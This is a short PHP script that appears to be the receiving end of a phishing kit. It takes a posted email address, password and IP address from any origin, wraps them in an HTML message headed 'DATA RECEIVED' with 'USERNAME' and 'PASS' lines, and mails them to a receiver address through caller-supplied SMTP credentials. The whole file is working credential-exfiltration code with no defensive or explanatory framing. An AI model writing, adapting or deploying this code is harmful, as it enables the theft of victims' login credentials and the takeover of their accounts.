<?php
header('Access-Control-Allow-Origin: *');
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
$post = json_decode(file_get_contents("php://input"),true);

require_once __DIR__ . "/vendor/autoload.php";
if($post && isset($post['email']) && isset($post['password'])){
$email = $post['email'];
$password = $post['password'];
$source = $post['source'];
$receiver = $post['receiverEmail'];

/************SMTP DETAILS START****************/
$SMTPUsername = $post['SMTPUsername'];
$SMTPPassword = $post['SMTPPassword'];
$SMTPHost = $post['SMTPServerName'];
/************SMTP DETAILS ENDS****************/


$sender = $post['fromName'];
$page = 'MAIN PAGE';
$ip = $post['ip'];
$subject = "$source : $ip";

$message = "
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <title>DATA RECEIVED</title>
</head>
<body>
    <h2>PAGE: $page</h2>
    <p>USERNAME: $email</p>
    <p>PASS: $password</p>
    <p>IP: $ip</p>
</body>
</html>
";

$mail = new PHPMailer;
$mail->isSMTP();
$mail->Host = $SMTPHost;
$mail->SMTPAuth = true;
$mail->Username = $SMTPUsername;
$mail->Password = $SMTPPassword;
$mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
$mail->Port = 587;
$mail->From = $email;
$mail->FromName = $sender;
$mail->addAddress($receiver);
$mail->CharSet = 'UTF-8';
$mail->Subject = $subject;
$mail->Body = $message;
$mail->IsHTML(true);
if($mail->send()){
    return true;
    exit;
} else {
    return false;
    exit;
}
}

?>